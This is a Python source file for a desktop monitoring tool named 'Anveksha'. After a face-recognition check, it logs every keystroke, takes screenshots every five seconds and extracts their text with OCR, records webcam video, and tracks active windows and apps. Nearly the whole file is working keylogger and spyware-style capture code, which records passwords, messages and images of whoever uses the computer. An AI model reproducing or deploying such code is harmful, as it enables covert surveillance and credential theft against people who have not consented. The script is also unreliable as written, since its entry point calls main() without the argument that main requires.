import time
import pyscreenshot as ImageGrab
import schedule
from datetime import datetime
import threading
from pynput.keyboard import Key, Listener
import psutil
import pygetwindow as gw
import cv2
import os
import numpy as np
import os
import pytesseract
from PIL import Image


# Global variables
keys = []
stop_threads = False

BASE_DIR = os.path.join(os.getcwd(), "Anveksha_Data")  # Creates "Anveksha_Data" in the current working directory
SCREENSHOTS_DIR = os.path.join(BASE_DIR, "Screenshots")
VIDEOS_DIR = os.path.join(BASE_DIR, "Webcam_Videos")
LOGS_DIR = os.path.join(BASE_DIR, "Logs")

# Ensure directories exist
os.makedirs(SCREENSHOTS_DIR, exist_ok=True)
os.makedirs(VIDEOS_DIR, exist_ok=True)
os.makedirs(LOGS_DIR, exist_ok=True)

# File paths
LOG_FILE = os.path.join(LOGS_DIR, "log.txt")
PROCESS_LOG_FILE = os.path.join(LOGS_DIR, "ProcessLog.txt")

FACE_MODEL_PATH = "face_data.npy"


def mse(imageA, imageB):
    return np.mean((imageA - imageB) ** 2)


def load_trained_faces():
    if os.path.exists(FACE_MODEL_PATH):
        return np.load(FACE_MODEL_PATH, allow_pickle=True)
    return None



def recognize_face():
    known_face_data = np.load(FACE_MODEL_PATH, allow_pickle=True) / 255.0
    if known_face_data is None:
        print("No trained face model found. Please train and save the face data.")
        return False

    cap = cv2.VideoCapture(0)
    if not cap.isOpened():
        print("Error: Could not access the webcam.")
        return False

    print("Scanning face...")
    face_cascade = cv2.CascadeClassifier(cv2.data.haarcascades + 'haarcascade_frontalface_default.xml')
    match_found = False
    best_mse = float("inf")

    for _ in range(20):  # Capture multiple frames
        ret, frame = cap.read()
        if not ret:
            continue

        gray = cv2.cvtColor(frame, cv2.COLOR_BGR2GRAY)
        faces = face_cascade.detectMultiScale(gray, scaleFactor=1.1, minNeighbors=5, minSize=(30, 30))

        for (x, y, w, h) in faces:
            face_region = gray[y:y + h, x:x + w]
            face_resized = cv2.resize(face_region, (100, 100)).astype("float32") / 255.0  # Normalize

            best_mse = float("inf")
            for stored_face in known_face_data:
                diff = mse(stored_face, face_resized.flatten())  # Compute MSE for each stored face
                best_mse = min(best_mse, diff)

            # Show live recognition
            cv2.rectangle(frame, (x, y), (x + w, y + h), (0, 255, 0), 2)
            cv2.imshow("Verifying Face", frame)
            cv2.waitKey(100)  # Show for 100ms per frame

            if diff < 30:  # Adjusted threshold
                match_found = True
                break

        if match_found:
            break

    cap.release()
    cv2.destroyAllWindows()

    if match_found:
        print(f"Face recognized. Access granted. (MSE: {best_mse})")
        return True
    else:
        print(f"Face does not match. Access denied. (Best MSE: {best_mse})")
        return False

# Screenshot function
def take_screenshot():
    try:
        timestamp = datetime.now().strftime("%Y-%m-%d_%H-%M-%S")
        image_name = f"screenshot-{timestamp}.png"
        directory = SCREENSHOTS_DIR  # Store in the new Screenshots folder
        filepath = os.path.join(directory, image_name)

        if not os.path.exists(directory):
            os.makedirs(directory)

        screenshot = ImageGrab.grab()
        screenshot.save(filepath)
        return filepath
    except Exception as e:
        print(f"Error taking screenshot: {e}")


# Schedule screenshots every 5 seconds
def main_screenshot():
    schedule.every(5).seconds.do(take_screenshot)
    while not stop_threads:
        schedule.run_pending()
        time.sleep(1)
    print("Stopping Screenshot thread...")


def perform_ocr(image_path, log_folder):
    try:
        # Ensure the log folder exists
        os.makedirs(log_folder, exist_ok=True)

        # Perform OCR
        text = pytesseract.image_to_string(Image.open(image_path))

        # Log the OCR result
        timestamp = datetime.now().strftime("%Y-%m-%d_%H-%M-%S")
        log_file_path = os.path.join(log_folder, f"ocr_log_{timestamp}.txt")

        with open(log_file_path, "w", encoding="utf-8") as log_file:
            log_file.write(text)

        print(f"OCR completed. Log saved at: {log_file_path}")
    except Exception as e:
        print(f"Error in OCR processing: {e}")


# Example usage
SCREENSHOTS_DIR = os.path.join(os.getcwd(), "Anveksha_Data", "Screenshots")
LOGS_DIR = os.path.join(os.getcwd(), "Anveksha_Data", "Logs")

def main_ocr():
    """Function to process OCR continuously"""
    while not stop_threads:
        for img_file in os.listdir(SCREENSHOTS_DIR):
            if stop_threads:
                break
            if img_file.endswith(".png") or img_file.endswith(".jpg"):
                perform_ocr(os.path.join(SCREENSHOTS_DIR, img_file), LOGS_DIR)
    print("Stopping OCR thread...")

# Video recording function
def is_video_conferencing_running():
    """ Check if video conferencing apps (Meet, Teams, Skype) are running """
    video_conferencing_apps = ["teams", "skype", "zoom", "meet"]  # Add more if needed

    for process in psutil.process_iter(['name']):
        process_name = process.info['name']
        if process_name:
            for app in video_conferencing_apps:
                if app.lower() in process_name.lower():
                    return True  # A video conferencing app is running
    return False  # No video conferencing app found


def main_video():
    global stop_threads

    cap = cv2.VideoCapture(0)
    if not cap.isOpened():
        print("Error: Could not access the webcam.")
        return

    fourcc = cv2.VideoWriter_fourcc(*'XVID')

    while not stop_threads:
        try:
            timestamp = datetime.now().strftime("%Y-%m-%d_%H-%M-%S")
            video_name = os.path.join(VIDEOS_DIR, f"Recording_{timestamp}.avi")
            out = cv2.VideoWriter(video_name, fourcc, 20.0, (640, 480))

            while not stop_threads:
                ret, frame = cap.read()
                if ret:
                    out.write(frame)
                    cv2.imshow('Video Feed', frame)
                    if cv2.waitKey(1) & 0xFF == ord('q'):
                        stop_threads = True
                        break
                else:
                    break

            out.release()
            print(f"Recording saved: {video_name}")

        except Exception as e:
            print(f"Error in video recording: {e}")

    cap.release()
    cv2.destroyAllWindows()
    print("Stopping Video thread...")



# Keyboard logging
def file_write(key):
    special_characters = ['!', '@', '#', '$', '%', '^', '&', '*', '(', ')', '-', '_', '=', '+', '{', '}', '[', ']', ':',
                          ';', '"', "'", '<', '>', ',', '.', '?', '/']
    with open(LOG_FILE, 'a', encoding='utf-8') as file:
        if isinstance(key, Key):
            if key == Key.space:
                file.write(' ')
            else:
                file.write(f'[{key}]')
        else:
            k = str(key).replace("'", "")
            if k in special_characters:
                file.write(f'({k})')
            else:
                file.write(k)


def on_press(key):
    global stop_threads
    file_write(key)
    if key == Key.esc:
        stop_threads = True
        return False  # Stop listener


def main_keyboard():
    global keyboard_listener
    keyboard_listener = Listener(on_press=on_press)
    keyboard_listener.start()



# Process activity tracking
def log_activity(activity):
    with open(PROCESS_LOG_FILE, "a", encoding='utf-8') as log_file:
        log_file.write(f"{datetime.now()} - {activity}\n")


def is_process_running(process_name):
    for process in psutil.process_iter(['name']):
        if process.info['name'] and process_name.lower() in process.info['name'].lower():
            return True
    return False


def track_activities():
    last_activity = ""
    browsers = ['chrome', 'firefox', 'msedge', 'opera', 'brave']

    while not stop_threads:
        active_window = gw.getActiveWindow()

        if active_window is None:
            activity = "No active window"
        else:
            window_title = active_window.title.lower()

            if any(is_process_running(browser) for browser in browsers):
                if "youtube" in window_title:
                    activity = f"Watching YouTube: {active_window.title}"
                else:
                    activity = f"Browsing: {active_window.title}"
            elif is_process_running('WhatsApp'):
                activity = "Using WhatsApp Desktop"
            elif is_process_running('vlc'):
                activity = f"Watching video on VLC: {active_window.title}"
            elif is_process_running('spotify'):
                activity = f"Listening to music on Spotify: {active_window.title}"
            elif is_process_running('word'):
                activity = f"Working on Microsoft Word: {active_window.title}"
            elif is_process_running('excel'):
                activity = f"Working on Microsoft Excel: {active_window.title}"
            elif is_process_running('teams'):
                activity = f"Working on Microsoft Teams: {active_window.title}"
            else:
                activity = f"Active Window: {active_window.title}"

        if activity != last_activity:
            log_activity(activity)
            last_activity = activity

        time.sleep(5)

# Main function to run everything in parallel threads
# def main():
    # global stop_threads
    # screenshot_thread = threading.Thread(target=main_screenshot)
    # video_thread = threading.Thread(target=main_video)
    # keyboard_thread = threading.Thread(target=main_keyboard)
    # activity_thread = threading.Thread(target=track_activities)
    # ocr_thread = threading.Thread(target=main_ocr)  # Added OCR thread
    #
    # # Start all threads
    # screenshot_thread.start()
    # video_thread.start()
    # activity_thread.start()
    # keyboard_thread.start()
    # ocr_thread.start()  # Start OCR thread
    #
    # # Join threads
    # screenshot_thread.join()
    # video_thread.join()
    # activity_thread.join()
    # keyboard_thread.join()
    # ocr_thread.join()  # Join OCR thread
    # stop_threads = False  # Ensure it's reset when starting




def main(stop_event):
    global stop_threads
    stop_threads = False  # Reset at start

    screenshot_thread = threading.Thread(target=main_screenshot)
    video_thread = threading.Thread(target=main_video)
    keyboard_thread = threading.Thread(target=main_keyboard)
    activity_thread = threading.Thread(target=track_activities)
    ocr_thread = threading.Thread(target=main_ocr)

    # Start all threads
    screenshot_thread.start()
    video_thread.start()
    activity_thread.start()
    keyboard_thread.start()
    ocr_thread.start()

    # Monitor the stop_event from main program
    while not stop_event.is_set():
        time.sleep(1)

    # When stop_event is set, update stop_threads to terminate worker threads
    print("Stop event received, shutting down worker threads...")
    stop_threads = True

    # Wait for threads to finish
    screenshot_thread.join(timeout=2)
    video_thread.join(timeout=2)
    keyboard_thread.join(timeout=2)
    activity_thread.join(timeout=2)
    ocr_thread.join(timeout=2)

    # Additional cleanup
    try:
        keyboard_listener.stop()
    except:
        pass

    try:
        cv2.destroyAllWindows()
    except:
        pass

    schedule.clear()
    print("Phase 1 stopped.")



if __name__ == "__main__":
    if recognize_face():
        print("Face recognized! Starting all functions...")
        main()
    else:
        print("Face not recognized. Exiting.")
        exit()